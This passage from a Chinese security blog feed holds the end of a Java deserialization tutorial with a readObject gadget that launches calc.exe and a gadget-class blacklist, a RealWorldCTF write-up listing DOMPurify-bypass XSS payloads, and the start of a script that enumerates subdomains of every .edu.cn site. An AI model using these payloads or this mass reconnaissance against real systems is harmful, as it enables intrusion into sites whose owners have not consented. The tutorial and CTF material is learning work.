ObjectOutputStream(fileOut);</span><br><span class="line">            <span class="comment">// 输出反序列化对象</span></span><br><span class="line">            out.writeObject(e);</span><br><span class="line">            out.close();</span><br><span class="line">            fileOut.close();</span><br><span class="line">            System.out.printf(<span class="string">&quot;Serialized data is saved in C:\\Users\\Oringals\\Desktop\\employee1.db&quot;</span>);</span><br><span class="line">          </span><br><span class="line">        &#125;<span class="keyword">catch</span> (IOException i)</span><br><span class="line">        &#123;</span><br><span class="line">            i.printStackTrace();</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;<span class="keyword">catch</span> (ClassNotFoundException c)</span><br><span class="line">        &#123;</span><br><span class="line">            System.out.println(<span class="string">&quot;Employee class not found&quot;</span>);</span><br><span class="line">            c.printStackTrace();</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>然后，再读取二进制文件中的内容，将文件的内容进行反序列化为对象进行输出</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">SerializeDemo</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        Employee e = <span class="keyword">null</span>;</span><br><span class="line">        <span class="keyword">try</span>&#123;</span><br><span class="line">            FileInputStream fileIn = <span class="keyword">new</span> FileInputStream(<span class="string">&quot;C:\\Users\\Oringals\\Desktop\\employee1.db&quot;</span>);</span><br><span class="line">            ObjectInputStream in = <span class="keyword">new</span> ObjectInputStream(fileIn);</span><br><span class="line">            e = (Employee) in.readObject();</span><br><span class="line">            in.close();</span><br><span class="line">            fileIn.close();</span><br><span class="line">        &#125;<span class="keyword">catch</span> (IOException i)</span><br><span class="line">        &#123;</span><br><span class="line">            i.printStackTrace();</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;<span class="keyword">catch</span> (ClassNotFoundException c)</span><br><span class="line">        &#123;</span><br><span class="line">            System.out.println(<span class="string">&quot;Employee class not found&quot;</span>);</span><br><span class="line">            c.printStackTrace();</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        System.out.println(<span class="string">&quot;Deserialized Employee...&quot;</span>);</span><br><span class="line">        System.out.println(<span class="string">&quot;Name: &quot;</span> + e.name);</span><br><span class="line">        System.out.println(<span class="string">&quot;This is the&quot;</span>+e.identify+<span class="string">&quot;of the company&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>完成上面的步骤，就能够对反序列化有一个清晰的认识了，最起码知道了如何进行java的序列化和反序列化的操作。</p><h4 id="一个简单的反序列化漏洞案例"><a href="#一个简单的反序列化漏洞案例" class="headerlink" title="一个简单的反序列化漏洞案例"></a>一个简单的反序列化漏洞案例</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">test</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception</span>&#123;</span><br><span class="line">        UnsafeClass Unsafe = <span class="keyword">new</span> UnsafeClass();</span><br><span class="line">        Unsafe.name = <span class="string">&quot;hacked by K0uSAOF!!!&quot;</span>;</span><br><span class="line"></span><br><span class="line">        FileOutputStream fos = <span class="keyword">new</span> FileOutputStream(<span class="string">&quot;object&quot;</span>);</span><br><span class="line">        ObjectOutputStream os = <span class="keyword">new</span> ObjectOutputStream(fos);</span><br><span class="line">        <span class="comment">// writeObject()方法将Unsafe对象写入object文件</span></span><br><span class="line">        os.writeObject(Unsafe);</span><br><span class="line">        os.close();</span><br><span class="line">        <span class="comment">// 从文件中反序列化obj对象</span></span><br><span class="line">        FileInputStream fis = <span class="keyword">new</span> FileInputStream(<span class="string">&quot;object&quot;</span>);</span><br><span class="line">        ObjectInputStream ois = <span class="keyword">new</span> ObjectInputStream(fis);</span><br><span class="line">        <span class="comment">// 恢复对象</span></span><br><span class="line">        UnsafeClass objectFromDisk = (UnsafeClass) ois.readObject();</span><br><span class="line">        System.out.println(objectFromDisk.name);</span><br><span class="line">        ois.close();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">UnsafeClass</span> <span class="keyword">implements</span> <span class="title">Serializable</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> String name;</span><br><span class="line">    <span class="comment">// 重写readObject()方法</span></span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">readObject</span><span class="params">(java.io.ObjectInputStream in )</span> <span class="keyword">throws</span>  IOException, ClassNotFoundException </span>&#123;</span><br><span class="line">        <span class="comment">// 重写readObject()方法</span></span><br><span class="line">        in.defaultReadObject();</span><br><span class="line">        <span class="comment">// 执行命令</span></span><br><span class="line">        Runtime.getRuntime().exec(<span class="string">&quot;calc.exe&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>运行上面的代码，成功执行命令。</p><p><img src="/2023/01/10/%E6%8E%A2%E7%A9%B6java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/image-20230110090317526.png" alt="image-20230110090317526"></p><p>当然，程序员不可写这样的代码，按照我的理解，如果代码中执行命令的函数用到了反序列化后的对象属性作为参数，就会导致任意的命令执行漏洞，不过需要用户能够控制输入的序列化数据，这样就满足输入数据可控这个漏洞利用的关键条件了。</p><h3 id="反序化漏洞产生的情况"><a href="#反序化漏洞产生的情况" class="headerlink" title="反序化漏洞产生的情况"></a>反序化漏洞产生的情况</h3><p>查找网上的资料，可以知道反序列漏洞产生的场景有以下这么几种：</p><ul><li><h4 id="开发失误"><a href="#开发失误" class="headerlink" title="开发失误"></a>开发失误</h4><ul><li>重写ObjectInputStream对象的resolveClass方法中的检测可被绕过</li><li>使用第三方的类进行黑名单控制。虽然Java的语言严谨性要比PHP强的多，但在大型应用中想要采用黑名单机制禁用掉所有危险的对象几乎是不可能的。因此，如果在审计过程中发现了采用黑名单进行过滤的代码，多半存在一两个‘漏网之鱼’可以利用。并且采取黑名单方式仅仅可能保证此刻的安全，若在后期添加了新的功能，就可能引入了新的漏洞利用方式。所以仅靠黑名单是无法保证序列化过程的安全的。</li></ul></li><li><h4 id="基础库中隐藏的漏洞"><a href="#基础库中隐藏的漏洞" class="headerlink" title="基础库中隐藏的漏洞"></a>基础库中隐藏的漏洞</h4><p>2015年由黑客Gabriel Lawrence和Chris Frohoff发现的‘Apache Commons  Collections’类库直接影响了WebLogic、WebSphere、JBoss、Jenkins、OpenNMS等大型框架。直到今天该漏洞的影响仍未消散。</p><p>存在危险的基础库：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">commons-fileupload 1.3.1</span><br><span class="line">commons-io 2.4</span><br><span class="line">commons-collections 3.1</span><br><span class="line">commons-logging 1.2</span><br><span class="line">commons-beanutils 1.9.2</span><br><span class="line">org.slf4j:slf4j-api 1.7.21</span><br><span class="line">com.mchange:mchange-commons-java 0.2.11</span><br><span class="line">org.apache.commons:commons-collections 4.0</span><br><span class="line">com.mchange:c3p0 0.9.5.2</span><br><span class="line">org.beanshell:bsh 2.0b5</span><br><span class="line">org.codehaus.groovy:groovy 2.3.9</span><br><span class="line">org.springframework:spring-aop 4.1.4.RELEASE</span><br><span class="line">...</span><br></pre></td></tr></table></figure><p>因此，一些防护软件通过黑名单，禁用一些危险的类来进行防护。以下是某防护软件的禁用类黑名单：</p></li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&#39;org.apache.commons.collections.functors.InvokerTransformer&#39;,</span><br><span class="line">&#39;org.apache.commons.collections.functors.InstantiateTransformer&#39;,</span><br><span class="line">&#39;org.apache.commons.collections4.functors.InvokerTransformer&#39;,</span><br><span class="line">&#39;org.apache.commons.collections4.functors.InstantiateTransformer&#39;,</span><br><span class="line">&#39;org.codehaus.groovy.runtime.ConvertedClosure&#39;,</span><br><span class="line">&#39;org.codehaus.groovy.runtime.MethodClosure&#39;,</span><br><span class="line">&#39;org.springframework.beans.factory.ObjectFactory&#39;,</span><br><span class="line">&#39;xalan.internal.xsltc.trax.TemplatesImpl&#39;</span><br></pre></td></tr></table></figure><h3 id="反序化漏洞的利用"><a href="#反序化漏洞的利用" class="headerlink" title="反序化漏洞的利用"></a>反序化漏洞的利用</h3><p>一般在发现目标使用了危险的类后，使用<code>ysoserial</code>工具生成对应的载荷进行反序列化漏洞的利用</p><p><img src="/2023/01/10/%E6%8E%A2%E7%A9%B6java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/image-20230110092918371.png" alt="image-20230110092918371"></p><p>到这里再说一个工具，这个工具是用来分析序列化数据的，可以输出对应的类的信息，之后就可以进行一些分析研究了。</p><p><a href="https://github.com/NickstaDB/SerializationDumper/releases">点我前往工具下载页面</a></p><p><img src="/2023/01/10/%E6%8E%A2%E7%A9%B6java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/image-20230110093111159.png" alt="image-20230110093111159"></p><h3 id="写在最后"><a href="#写在最后" class="headerlink" title="写在最后"></a>写在最后</h3><p>本来还做了一个实验的，用的是<code>DeserLab</code>，不过复现失败了，在用ysoserial生成载荷发送载荷总是利用失败，而且后来才发现用相关的文章都是翻译国外的，所以最后就不搞了。</p><p>等我有时间，用vulfocus复现利用java相关的反序列化漏洞当作漏洞利用这块的经验补充。</p>]]></content>
      
      
      <categories>
          
          <category> web安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> java反序列化 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>realworldctf_解题过程记录</title>
      <link href="2023/01/08/realworldctf_%E8%A7%A3%E9%A2%98%E8%BF%87%E7%A8%8B%E8%AE%B0%E5%BD%95/"/>
      <url>2023/01/08/realworldctf_%E8%A7%A3%E9%A2%98%E8%BF%87%E7%A8%8B%E8%AE%B0%E5%BD%95/</url>
      
        <content type="html"><![CDATA[<h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>这篇文章主要记录笔者参加长亭科技举办的realworldctf比赛的经历。由于是第一次参加ctf比赛，没什么经验，所以只做出来了一道送分的签到题，但是还是有很多收获的。</p><p>总的来说，相比于实战渗透，ctf比赛更加着眼于对漏洞的理解程度（尤其是对代码层面的理解，各种过滤防护的新技术）；而实战渗透主要就是要熟悉已知的漏洞利用手法，以及各种变异的payload对防护软件进行绕过；当然因为有很多现成的工具可以利用漏洞，但是本质上来说发现web安全问题就是通过构造http数据包，发包，根据回显结果检测是否存在漏洞这几个步骤，工具只是自动化了这个过程而已，遇到复杂情况还是要对漏洞形成的原理有深入的理解才能利用成功，所以说打ctf比赛是加深对漏洞理解的好机会，同时，笔者对参加ctf比赛也是期待已久，这次总算是有机会参加了。</p><h3 id="解题过程"><a href="#解题过程" class="headerlink" title="解题过程"></a>解题过程</h3><h4 id="第一题"><a href="#第一题" class="headerlink" title="第一题"></a>第一题</h4><p>第一题叫做chat-in，这道题其实就是根据给出的一段哈希值去计算一个值，就和比特币挖矿类似，算是一个pow证明。</p><p><img src="/2023/01/08/realworldctf_%E8%A7%A3%E9%A2%98%E8%BF%87%E7%A8%8B%E8%AE%B0%E5%BD%95/capture_20230107160113596.bmp" alt="capture_20230107160113596"></p><p>这里出题方温馨的给出了一个github脚本链接，这个脚本就是用来计算答案的。不过比较坑的地方是，如果你像笔者一样用的是<code>python 3.7.9</code>,那么恭喜你运行脚本之后就会报错，原因是没有加上<code>if __name__ ==&quot;__main__&quot;</code>，加上之后就可以正常运行脚本了，最后将计算出来的值填入就可以进入目标主机拿到flag了。</p><p><img src="/2023/01/08/realworldctf_%E8%A7%A3%E9%A2%98%E8%BF%87%E7%A8%8B%E8%AE%B0%E5%BD%95/capture_20230107160246982.bmp" alt="capture_20230107160246982"></p><p><img src="/2023/01/08/realworldctf_%E8%A7%A3%E9%A2%98%E8%BF%87%E7%A8%8B%E8%AE%B0%E5%BD%95/capture_20230107160253993.bmp" alt="capture_20230107160253993"></p><p><img src="/2023/01/08/realworldctf_%E8%A7%A3%E9%A2%98%E8%BF%87%E7%A8%8B%E8%AE%B0%E5%BD%95/capture_20230107160236881.bmp" alt="capture_20230107160236881"></p><p><img src="/2023/01/08/realworldctf_%E8%A7%A3%E9%A2%98%E8%BF%87%E7%A8%8B%E8%AE%B0%E5%BD%95/capture_20230107160017956.bmp" alt="capture_20230107160017956"></p><p><img src="/2023/01/08/realworldctf_%E8%A7%A3%E9%A2%98%E8%BF%87%E7%A8%8B%E8%AE%B0%E5%BD%95/image-20230108162012048.png" alt="image-20230108162012048"></p><p>笔者顺利拿到送分题的35积分，也是没想到，拿下送分题其实就已经超越很多人了。</p><p>之后还看了一下排行榜，一眼看上了一个叫<code>bule water</code>的大神（排名第一当时）也是一个人在战斗，看了一下他的解题记录，笔者觉得有一天也可以变得像他一样那么的强（手动狗头），不是在开玩笑，哈哈哈哈！</p><p><img src="/2023/01/08/realworldctf_%E8%A7%A3%E9%A2%98%E8%BF%87%E7%A8%8B%E8%AE%B0%E5%BD%95/image-20230108162209745.png" alt="image-20230108162209745"></p><p><img src="/2023/01/08/realworldctf_%E8%A7%A3%E9%A2%98%E8%BF%87%E7%A8%8B%E8%AE%B0%E5%BD%95/image-20230108162714403.png" alt="image-20230108162714403"></p><p>做完了这道题之后，笔者对hash算法的用途更加清晰了。</p><p>首先一个就是通过验证哈希值去比对代码是否被篡改过（哈希函数的单向性），笔者以前都只是学习书上的理论，密码学这方面的实践比较少，这次算是长见识了，知道了python如何去使用哈希算法。</p><h4 id="第二题"><a href="#第二题" class="headerlink" title="第二题"></a>第二题</h4><p>接下来就是痛苦之旅了，第二道web题考的是xss，一开始笔者没什么思路，后面在看附件的js代码的过程中有了大体的思路。</p><p><img src="/2023/01/08/realworldctf_%E8%A7%A3%E9%A2%98%E8%BF%87%E7%A8%8B%E8%AE%B0%E5%BD%95/image-20230108171543914.png" alt="image-20230108171543914"></p><p>Challenge的链接进入是一个聊天的页面，你可以发送一些信息</p><p><img src="/2023/01/08/realworldctf_%E8%A7%A3%E9%A2%98%E8%BF%87%E7%A8%8B%E8%AE%B0%E5%BD%95/image-20230108171753682.png" alt="image-20230108171753682"></p><p>xss bot进入是一个这样子的页面，到了这里，笔者觉出题人的意思是让你构造出一个能够绕过的xss payload ，然后xss bot会模拟admin去访问你的URL，再结合题目的说明，笔者们要做的是从admin的cookie中去获取flag。</p><p>现在，思路就变得清晰了起来。后续，笔者通过测试，这里输入的url只能是同源的，在一开始进入的聊天页面也是无法插入任何的html代码的。</p><p><img src="/2023/01/08/realworldctf_%E8%A7%A3%E9%A2%98%E8%BF%87%E7%A8%8B%E8%AE%B0%E5%BD%95/image-20230108171616114.png" alt="image-20230108171616114"></p><p><img src="/2023/01/08/realworldctf_%E8%A7%A3%E9%A2%98%E8%BF%87%E7%A8%8B%E8%AE%B0%E5%BD%95/image-20230108172020049.png" alt="image-20230108172020049"></p><p>后续通过获取附件，审计源码得知可以通过改变room参数为<code>DOMPurify</code>进入到另一个聊天页面。</p><p>笔者通过测试，发现再这个页面中可以插入图片，或者通过html带入一些css改变页面的背景图片引入一些外部资源。不过还是没有办法引入要执行js代码，像一些危险的属性和标签都会被过滤掉。</p><p>这里笔者还发现，这个聊天页面的显示的内容是通过js动态生成的，也就是说在生成html的过程中会对用户的输入进行一些安全过滤。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">可以插入图片</span><br><span class="line">&lt;img src&#x3D;&#39;&#39;&gt;</span><br><span class="line">通过css插入外部资源</span><br><span class="line">&lt;form&gt;&lt;math&gt;&lt;&#x2F;math&gt;&lt;style&gt;li&#123;background-image: url(&#39;http:&#x2F;&#x2F;123.249.90.73:8000&#x2F;1.html&#39;);&lt;&#x2F;style&gt;&lt;&#x2F;form&gt;</span><br></pre></td></tr></table></figure><p><img src="/2023/01/08/realworldctf_%E8%A7%A3%E9%A2%98%E8%BF%87%E7%A8%8B%E8%AE%B0%E5%BD%95/capture_20230108173832959.bmp" alt="capture_20230108173832959"></p><p><img src="/2023/01/08/realworldctf_%E8%A7%A3%E9%A2%98%E8%BF%87%E7%A8%8B%E8%AE%B0%E5%BD%95/image-20230108174200890.png" alt="image-20230108174200890"></p><p>这张图片是从一个xss平台上拿的payload，之后可以再xss平台上看到所有人的信息，但是插入图片的方式不支持获取cookie，当时还以为这道题已经被拿下了呢，白高兴一场，后面才发现要走的路还长。</p><p><img src="/2023/01/08/realworldctf_%E8%A7%A3%E9%A2%98%E8%BF%87%E7%A8%8B%E8%AE%B0%E5%BD%95/image-20230108175243652.png" alt="image-20230108175243652"></p><p>到这里思路断了，笔者继续审计js代码，发现网页是通过一个叫<code>DOMPurify.sanitize</code>的方法去进行过滤的。</p><p>于是，笔者通过查找相关的资料，尝试了一些网上的绕过方式，这里给出一些payload。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;svg&gt;&lt;&#x2F;p&gt;&lt;style&gt;&lt;a id&#x3D;&quot;&lt;&#x2F;style&gt;&lt;img src&#x3D;1 onerror&#x3D;alert(1)&gt;&quot;&gt;</span><br><span class="line">&lt;form&gt;&lt;math&gt;&lt;mtext&gt;&lt;&#x2F;form&gt;&lt;form&gt;&lt;mglyph&gt;&lt;style&gt;&lt;&#x2F;math&gt;&lt;img src onerror&#x3D;alert(1)&gt;</span><br><span class="line">&lt;svg&gt;&lt;&#x2F;p&gt;&lt;style&gt;&lt;a id&#x3D;&quot;&lt;&#x2F;style&gt;&lt;img src&#x3D;1 onerror&#x3D;alert(1)&gt;&quot;&gt;</span><br><span class="line">&lt;math&gt;&lt;mtext&gt;&lt;table&gt;&lt;mglyph&gt;&lt;style&gt;&lt;!--&lt;&#x2F;style&gt;&lt;img title&#x3D;&quot;--&gt;&lt;img src&#x3D;1 onerror&#x3D;alert(1)&gt;&quot;&gt;</span><br><span class="line">&lt;form&gt;&lt;math&gt;&lt;mtext&gt;&lt;&#x2F;form&gt;&lt;form&gt;&lt;mglyph&gt;&lt;svg&gt;&lt;mtext&gt;&lt;style&gt;&lt;path id&#x3D;&quot;&lt;&#x2F;style&gt;&lt;img onerror&#x3D;alert(\&#39;XSS\&#39;) src&gt;&quot;&gt;</span><br></pre></td></tr></table></figure><p><img src="/2023/01/08/realworldctf_%E8%A7%A3%E9%A2%98%E8%BF%87%E7%A8%8B%E8%AE%B0%E5%BD%95/capture_20230108180459576.bmp" alt="capture_20230108180459576"></p><p>很可惜，到这里还是没有成功，笔者就选择放弃了，接着，去看了下另外一道web有关php的题目。</p><h4 id="第三题"><a href="#第三题" class="headerlink" title="第三题"></a>第三题</h4><p><img src="/2023/01/08/realworldctf_%E8%A7%A3%E9%A2%98%E8%BF%87%E7%A8%8B%E8%AE%B0%E5%BD%95/image-20230108182538904.png" alt="image-20230108182538904"></p><p>这里要先进行一下pow的证明，然后才会启动服务。笔者进去之后，发现是一个登录页面，通过注册登录进去发现了之后一个功能点，当你输入一个链接点击explore，就会去加载这个网页并显示源代码。</p><p><img src="/2023/01/08/realworldctf_%E8%A7%A3%E9%A2%98%E8%BF%87%E7%A8%8B%E8%AE%B0%E5%BD%95/image-20230108182955536.png" alt="image-20230108182955536"><img src="/2023/01/08/realworldctf_%E8%A7%A3%E9%A2%98%E8%BF%87%E7%A8%8B%E8%AE%B0%E5%BD%95/image-20230108183026091.png" alt="image-20230108183026091"></p><p>后续笔者下载了附件，简单的审计了一下源代码，没有什么思路，不过这里大概率是一个ssrf漏洞。</p><h3 id="最后的话"><a href="#最后的话" class="headerlink" title="最后的话"></a>最后的话</h3><p>尽管这次ctf比赛的表现不怎么样，但是开阔了自己的视野是真的，像pwn，Crypto这些方向笔者还是很有兴趣的。所以，接下来笔者会更加努力的学习，不过得先把代码审计和内网渗透这两座山解决了。</p><p>好了，今天就写这些东西了，收工！</p>]]></content>
      
      
      <categories>
          
          <category> ctf </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>web打点_全网edu网站指纹识别_脚本全自动化</title>
      <link href="2023/01/07/web%E6%89%93%E7%82%B9_%E5%85%A8%E7%BD%91edu%E7%BD%91%E7%AB%99%E6%8C%87%E7%BA%B9%E8%AF%86%E5%88%AB_%E8%84%9A%E6%9C%AC%E5%85%A8%E8%87%AA%E5%8A%A8%E5%8C%96/"/>
      <url>2023/01/07/web%E6%89%93%E7%82%B9_%E5%85%A8%E7%BD%91edu%E7%BD%91%E7%AB%99%E6%8C%87%E7%BA%B9%E8%AF%86%E5%88%AB_%E8%84%9A%E6%9C%AC%E5%85%A8%E8%87%AA%E5%8A%A8%E5%8C%96/</url>
      
        <content type="html"><![CDATA[<h3 id="0x00-思路"><a href="#0x00-思路" class="headerlink" title="0x00 思路"></a>0x00 思路</h3><ol><li><p>先通过fofa搜索全网的edu网站，导出到本地，将结果复制到urls.txt</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">fofa: host&#x3D;&quot;.edu.cn&quot;</span><br></pre></td></tr></table></figure><p><img src="/2023/01/07/web%E6%89%93%E7%82%B9_%E5%85%A8%E7%BD%91edu%E7%BD%91%E7%AB%99%E6%8C%87%E7%BA%B9%E8%AF%86%E5%88%AB_%E8%84%9A%E6%9C%AC%E5%85%A8%E8%87%AA%E5%8A%A8%E5%8C%96/image-20230107062110192.png" alt="image-20230107062110192"></p></li></ol><ol start="2"><li><p>编写python脚本，对urls.txt文件中重复主站点的url进行删除，然后再自动化调用subfinder进行子域名搜集，把子域名搜索结果分别保存到以主站点为名的csv文件中。之后，再写一个调用Finger(python编写的一款指纹识别工具)的脚本，对每个主站点的子域名进行指纹识别。</p><p><img src="/2023/01/07/web%E6%89%93%E7%82%B9_%E5%85%A8%E7%BD%91edu%E7%BD%91%E7%AB%99%E6%8C%87%E7%BA%B9%E8%AF%86%E5%88%AB_%E8%84%9A%E6%9C%AC%E5%85%A8%E8%87%AA%E5%8A%A8%E5%8C%96/image-20230107064006952.png" alt="image-20230107064006952"></p></li></ol><h3 id="0x01-具体实现"><a href="#0x01-具体实现" class="headerlink" title="0x01 具体实现"></a>0x01 具体实现</h3><p>这里直接给出我写的两个脚本，一个是调用subfinder实现自动化，另一个是调用finger实现自动化</p><p><code>auto_serach_domain.py</code></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">去掉重复的域名</span></span><br><span class="line"><span class="string">调用subfinder查找子域名</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_main_domain</span>(<span class="params">url</span>):</span></span><br><span class="line">    <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">    对子域名进行处理，返回主域名</span></span><br><span class="line"><span class="string">    &#x27;&#x27;&#x27;</span></span><br><span class="line">    url = url.split(<span class="string">&quot;.&quot;</span>)</span><br><span class="line">    url[-<span class="number">1</span>] = url[-<span class="number">1</span>].replace(<span class="string">&#x27;\n&#x27;</span>, <span class="string">&#x27;&#x27;</span>)</span><br><span class="line">    url = url[-<span class="number">3</span>]+<span class="string">&#x27;.&#x27;</span>+url[-<span class="number">2</span>]+<span class="string">&#x27;.&#x27;</span>+url[-<span class="number">1</span>]</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&quot;//&quot;</span> <span class="keyword">in</span> url:</span><br><span class="line">        url = url.replace(<span class="string">&#x27;http://&#x27;</span>,<span class="string">&#x27;&#x27;</span>).replace(<span class="string">&#x27;https://&#x27;</span>,<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&quot;:&quot;</span> <span class="keyword">in</span> url:</span><br><span class="line">        url = url.split(<span class="string">&#x27;:&#x27;</span>)[<span class="number">0</span>]</span><br><span class="line">    <span class="keyword">return</span> url</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">move_again_domain</span>(<span class="params">url_list</span>):</span></span><br><span class="line">    <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">    对域名进行去重处理</span></span><br><span class="line"><span class="string">    &#x27;&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">list</span>(<span class="built_in">set</span>(url_list))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">run</span>(<span class="params">url</span>):</span></span><br><span class="line">    <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">    调用subfinder查找子域名</span></span><br><span class="line"><span class="string">    &#x27;&#x27;&#x27;</span></span><br><span class="line">    save_file = url + <span class="string">&#x27;.csv&#x27;</span></span><br><span class="line">    command = <span class="string">f&#x27;subfinder.exe -d <span class="subst">&#123;url&#125;</span> -all -nW -oI -o <span class="subst">&#123;save_file&#125;</span>&#x27;</span></span><br><span class="line">    print(<span class="string">f&quot;[+] current run command: <span class="subst">&#123;command&#125;</span>&quot;</span>)</span><br><span class="line">    print(<span class="string">f&#x27;[+] current search url: <span class="subst">&#123;url&#125;</span>&#x27;</span>)</span><br><span class="line">    os.system(command)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span>():</span></span><br><span class="line">    u = []</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;urls.txt&#x27;</span>,<span class="string">&#x27;r&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        urls = 